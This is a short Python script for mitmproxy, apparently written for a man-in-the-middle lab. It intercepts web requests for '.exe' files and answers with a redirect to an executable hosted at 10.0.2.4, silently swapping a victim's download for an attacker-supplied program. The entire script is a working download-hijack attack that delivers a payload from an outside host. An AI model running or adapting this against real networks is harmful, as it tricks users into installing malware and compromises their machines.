import mitmproxy

def request(flow):
	if flow.request.host != "10.0.2.15" and flow.request.pretty_url.endswith(".exe"):
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://10.0.2.4/install.exe"})